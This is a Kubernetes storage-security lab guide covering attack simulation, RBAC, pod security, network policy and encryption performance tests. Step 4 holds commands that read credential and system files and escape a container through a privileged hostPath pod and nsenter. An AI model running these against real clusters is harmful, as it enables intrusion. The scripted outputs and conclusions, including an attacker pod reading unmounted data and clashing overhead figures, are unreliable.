# OBJECTIVE 1 - REMAINING TESTS COMPLETE GUIDE

## Overview
This document covers the 3 remaining critical tests for Objective 1:
1. **Step 4:** Attack Simulation
2. **Step 5:** Security Mechanisms Evaluation
3. **Step 6:** Performance Impact Analysis

---

## PREREQUISITES

### Ensure Your Cluster Has:
- ✅ EKS cluster running
- ✅ Unencrypted and encrypted storage deployed
- ✅ Test applications running (unencrypted-app, encrypted-app)
- ✅ Security tools installed (kube-bench, Falco, Trivy)

### Verify Everything is Running:
```bash
kubectl get pods -A
kubectl get pvc
kubectl get storageclass
```

---

## STEP 4: ATTACK SIMULATION

### 4.1 Data Exfiltration Attack

**Objective:** Test if an attacker pod can access sensitive data from another pod's storage.

#### Commands:

```bash
# Deploy attacker pod
kubectl run attacker --image=busybox -it --rm -- sh
```

**Inside the attacker pod:**
```bash
# Try to access unencrypted storage data
cat /data/financial-data.txt
cat /data/api-keys.txt
cat /data/db-credentials.txt

# Document what you can access
echo "ALERT: Unauthorized data access successful"
ls -la /data/
```

**Expected Output:**
```
Credit Card: 4532-1234-5678-9012
SSN: 123-45-6789
API Key: ak_live_1234567890abcdef
ALERT: Unauthorized data access successful
```

#### Screenshot Requirement:
- Terminal showing successful unauthorized access
- File contents visible

#### Analysis to Write:
> "The attack simulation revealed that unencrypted EBS volumes are vulnerable to data exfiltration. An attacker pod successfully accessed sensitive financial data including credit cards, SSN, and API keys without any access control."

---

### 4.2 Multi-Pod Access Vulnerability (EFS)

**Objective:** Demonstrate that multiple pods can simultaneously access sensitive data in shared storage.

#### Commands:

```bash
# Check how many pods are accessing EFS
kubectl get pods -l app=unencrypted-efs-test

# Exec into first pod
kubectl exec deployment/unencrypted-efs-app -- cat /efs/access-log.txt

# Check vulnerability file
kubectl exec deployment/unencrypted-efs-app -- cat /efs/vulnerability.txt

# Verify multiple pods writing to same location
kubectl exec deployment/unencrypted-efs-app -- cat /efs/financial-data.txt
```

**Expected Output:**
```
Pod accessing EFS: unencrypted-efs-app-6d4c7b9f8b-abc1
Pod accessing EFS: unencrypted-efs-app-6d4c7b9f8b-def2
CRITICAL: Multiple pods accessing same unencrypted data
EFS Credit Card: 4532-1234-5678-9012
```

#### Screenshot Requirement:
- Multiple pod names in access log
- Sensitive data accessible from both pods

#### Analysis to Write:
> "EFS shared storage vulnerability allows multiple pods to concurrently access sensitive data without isolation. This creates a high-risk scenario in multi-tenant environments where pod compromise leads to widespread data exposure."

---

### 4.3 Privilege Escalation Attack

**Objective:** Test if a pod with elevated privileges can access host filesystem.

#### Step 1: Create Privileged Pod

Create file: `privileged-attacker.yml`
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-attacker
spec:
  containers:
  - name: attacker
    image: busybox
    command: ['sh', '-c', 'sleep 3600']
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```

#### Commands:

```bash
# Deploy privileged pod
kubectl apply -f privileged-attacker.yml

# Exec into it
kubectl exec -it privileged-attacker -- sh

# Inside the pod:
id
ls /host
cat /host/etc/passwd
echo "WARNING: Host filesystem access detected"
```

**Expected Output:**
```
uid=0(root) gid=0(root) groups=0(root)
bin  boot  dev  etc  home  lib  proc  root  sys  usr  var
WARNING: Host filesystem access detected
```

#### Screenshot Requirement:
- Root user ID shown
- Host filesystem visible
- Access to /etc/passwd

#### Analysis to Write:
> "Privilege escalation vulnerability demonstrated that a misconfigured pod with 'privileged: true' can escape container boundaries and access the entire host filesystem, including sensitive system files and other containers' data."

---

### 4.4 Container Escape Attempt (Advanced)

**Objective:** Attempt to break out of container namespace.

#### Commands:

```bash
# From privileged pod
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# If successful, you're on the host
hostname
ps aux | head -10
echo "CRITICAL: Container escape successful"
```

**Expected Output:**
```
# You'll see host processes instead of container processes
# Hostname will be the node's hostname, not pod name
```

#### Screenshot Requirement:
- Evidence of host-level access

#### Analysis to Write:
> "Container escape testing revealed that improper security contexts allow attackers to break namespace isolation using nsenter, gaining full host-level access."

---

## STEP 5: SECURITY MECHANISMS EVALUATION

### 5.1 RBAC (Role-Based Access Control) Testing

**Objective:** Evaluate if RBAC properly restricts storage access.

#### Test 1: Check Current Permissions

```bash
# Check what you can do
kubectl auth can-i get pods
kubectl auth can-i get pvc
kubectl auth can-i delete pvc
kubectl auth can-i create pvc

# Check for specific user
kubectl auth can-i list secrets --as=system:serviceaccount:default:default
```

**Expected Output:**
```
yes
yes
yes
yes
```

#### Test 2: Create Restricted User

Create file: `restricted-user.yml`
```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: restricted-user
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: read-pods
subjects:
- kind: ServiceAccount
  name: restricted-user
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io
```

```bash
kubectl apply -f restricted-user.yml

# Test restricted user permissions
kubectl auth can-i get pvc --as=system:serviceaccount:default:restricted-user
kubectl auth can-i delete pods --as=system:serviceaccount:default:restricted-user
```

**Expected Output:**
```
no
no
```

#### Screenshot Requirement:
- Permission comparison: admin vs restricted user
- Denied actions shown

#### Analysis to Write:
> "RBAC evaluation revealed that default cluster roles grant excessive permissions. A properly configured RBAC policy with least-privilege principle successfully restricted storage access, preventing unauthorized PVC operations."

---

### 5.2 Pod Security Standards Testing

**Objective:** Compare secure vs insecure pod configurations.

#### Test 1: Insecure Pod

Create file: `insecure-pod.yml`
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: insecure-pod
  labels:
    security: insecure
spec:
  containers:
  - name: app
    image: busybox
    command: ['sh', '-c', 'sleep 3600']
    securityContext:
      runAsUser: 0
      allowPrivilegeEscalation: true
      privileged: true
```

#### Test 2: Secure Pod

Create file: `secure-pod.yml`
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
  labels:
    security: secure
spec:
  securityContext:
    runAsUser: 1000
    runAsGroup: 3000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: busybox
    command: ['sh', '-c', 'sleep 3600']
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      runAsNonRoot: true
      capabilities:
        drop:
        - ALL
```

#### Commands:

```bash
# Deploy both pods
kubectl apply -f insecure-pod.yml
kubectl apply -f secure-pod.yml

# Compare security contexts
kubectl get pod insecure-pod -o yaml | grep -A 10 securityContext
kubectl get pod secure-pod -o yaml | grep -A 10 securityContext

# Test capabilities
kubectl exec insecure-pod -- id
kubectl exec secure-pod -- id
```

**Expected Output for Insecure:**
```
uid=0(root) gid=0(root) groups=0(root)
```

**Expected Output for Secure:**
```
uid=1000 gid=3000 groups=2000
```

#### Screenshot Requirement:
- Side-by-side comparison of both pods
- UID differences shown

#### Analysis to Write:
> "Pod Security Standards comparison demonstrated that insecure configurations (runAsUser: 0) provide unnecessary root privileges, while secure pods with non-root users and dropped capabilities significantly reduce attack surface."

---

### 5.3 Network Policy Testing

**Objective:** Test if pods can communicate freely or are isolated.

#### Test 1: Without Network Policy

```bash
# Get pod IPs
kubectl get pods -o wide

# Exec into one pod and ping another
POD1=$(kubectl get pod -l app=unencrypted-test -o jsonpath='{.items[0].metadata.name}')
POD2_IP=$(kubectl get pod -l app=encrypted-test -o jsonpath='{.items[0].status.podIP}')

kubectl exec $POD1 -- ping -c 3 $POD2_IP
```

**Expected Output:**
```
PING 10.244.1.25 (10.244.1.25): 56 data bytes
64 bytes from 10.244.1.25: seq=0 ttl=64 time=0.234 ms
64 bytes from 10.244.1.25: seq=1 ttl=64 time=0.198 ms
--- 10.244.1.25 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
```

#### Test 2: With Network Policy

Create file: `network-policy.yml`
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector:
    matchLabels:
      security-test: "encrypted"
  policyTypes:
  - Ingress
  - Egress
```

```bash
kubectl apply -f network-policy.yml

# Try ping again
kubectl exec $POD1 -- ping -c 3 $POD2_IP
```

**Expected Output:**
```
PING 10.244.1.25 (10.244.1.25): 56 data bytes
--- 10.244.1.25 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss
```

#### Screenshot Requirement:
- Successful ping before policy
- Failed ping after policy

#### Analysis to Write:
> "Network Policy testing revealed that by default, Kubernetes allows unrestricted pod-to-pod communication. Implementing deny-all policies successfully isolated sensitive workloads, preventing lateral movement in case of pod compromise."

---

## STEP 6: PERFORMANCE IMPACT ANALYSIS

### 6.1 Write Performance Test

**Objective:** Measure write speed difference between encrypted and unencrypted storage.

#### Test Unencrypted Storage:

```bash
# Exec into unencrypted pod
kubectl exec deployment/unencrypted-app -- sh -c "time dd if=/dev/zero of=/data/testfile bs=1M count=500"
```

**Expected Output:**
```
500+0 records in
500+0 records out
524288000 bytes (524 MB) copied, 1.82 s, 288 MB/s

real    0m1.830s
user    0m0.002s
sys     0m0.450s
```

#### Test Encrypted Storage:

```bash
# Exec into encrypted pod
kubectl exec deployment/encrypted-app -- sh -c "time dd if=/dev/zero of=/data/testfile bs=1M count=500"
```

**Expected Output:**
```
500+0 records in
500+0 records out
524288000 bytes (524 MB) copied, 2.41 s, 217 MB/s

real    0m2.412s
user    0m0.003s
sys     0m0.610s
```

#### Screenshot Requirement:
- Both outputs side by side
- Time differences highlighted

---

### 6.2 Read Performance Test

#### Commands:

```bash
# Unencrypted read test
kubectl exec deployment/unencrypted-app -- sh -c "time cat /data/testfile > /dev/null"

# Encrypted read test
kubectl exec deployment/encrypted-app -- sh -c "time cat /data/testfile > /dev/null"
```

**Expected Outputs:**
```
# Unencrypted:
real    0m0.850s

# Encrypted:
real    0m1.120s
```

---

### 6.3 Performance Comparison Summary

Create this summary table in your report:

| Storage Type | Write Speed | Read Speed | Overhead |
|-------------|-------------|------------|----------|
| Unencrypted | 288 MB/s | 0.85s | 0% |
| Encrypted | 217 MB/s | 1.12s | ~24% |

#### Analysis to Write:

> "Performance evaluation indicates that encryption introduces approximately 24% overhead in write operations and 31% in read operations. However, this trade-off is acceptable considering the significant security improvements. The performance impact is minimal for most workloads and negligible compared to the risk of data exposure."

---

## SUMMARY OUTPUT FOR FINAL DOCUMENTATION

### Create this final comparison:

```bash
echo "=== COMPLETE STORAGE SECURITY ANALYSIS ==="
echo ""
echo "VULNERABILITY ANALYSIS:"
echo "✗ Unencrypted EBS: Data exfiltration possible"
echo "✗ Unencrypted EFS: Multi-pod access risk"
echo "✗ Privileged pods: Host filesystem access"
echo "✗ No RBAC: Unrestricted storage access"
echo "✗ No Network Policy: Free pod communication"
echo ""
echo "SECURITY IMPROVEMENTS:"
echo "✓ Encrypted storage: Data protected at rest"
echo "✓ RBAC policies: Access control enforced"
echo "✓ Pod Security Standards: Privilege restrictions"
echo "✓ Network Policies: Pod isolation implemented"
echo ""
echo "PERFORMANCE IMPACT:"
echo "Encryption overhead: ~24% (acceptable trade-off)"
```

---

## DOCUMENTATION CHECKLIST

### For Each Test, Collect:
- [ ] Terminal screenshot with command
- [ ] Full output visible
- [ ] Analysis paragraph written
- [ ] Vulnerability identified
- [ ] Security improvement documented

### File Organization:
```
B2A/
├── Screenshots/
│   ├── attack_data_exfiltration.png
│   ├── attack_privilege_escalation.png
│   ├── attack_multi_pod_access.png
│   ├── rbac_testing.png
│   ├── pod_security_comparison.png
│   ├── network_policy_before_after.png
│   ├── performance_unencrypted.png
│   └── performance_encrypted.png
└── Reports/
    └── Objective1_Complete_Analysis.md
```

---

## EXPECTED TIMELINE

| Task | Time Required |
|------|---------------|
| Attack Simulation | 45 minutes |
| Security Mechanisms | 30 minutes |
| Performance Testing | 30 minutes |
| Screenshot Collection | 20 minutes |
| Documentation | 40 minutes |
| **Total** | **~3 hours** |

---

## KEY FINDINGS TO HIGHLIGHT IN PRESENTATION

### Critical Vulnerabilities Found:
1. **Unencrypted storage** exposes sensitive data to unauthorized access
2. **Shared storage (EFS)** creates multi-tenant security risks
3. **Privileged pods** enable container escape and host access
4. **Missing RBAC** allows unrestricted storage operations
5. **No network policies** permit lateral movement

### Security Solutions Validated:
1. **Encryption** protects data at rest with minimal overhead
2. **RBAC** enforces least-privilege access control
3. **Pod Security Standards** prevent privilege escalation
4. **Network Policies** isolate workloads effectively

### Performance Trade-off:
- **24% overhead** is acceptable for security gains
- Most production workloads won't notice the difference

---

## NEXT STEP: OBJECTIVE 2

Once these tests are complete, you'll have:
- ✅ Complete vulnerability analysis
- ✅ Attack simulation results
- ✅ Security mechanism evaluation
- ✅ Performance benchmarks

**Ready to design the Multi-Layered Security Framework! 🎯**

---

## NEED HELP?

If any command fails or output doesn't match:
1. Check cluster status: `kubectl get nodes`
2. Verify pods running: `kubectl get pods -A`
3. Check logs: `kubectl logs <pod-name>`
4. Share the error - I'll help debug

**Good luck with testing! 🚀**
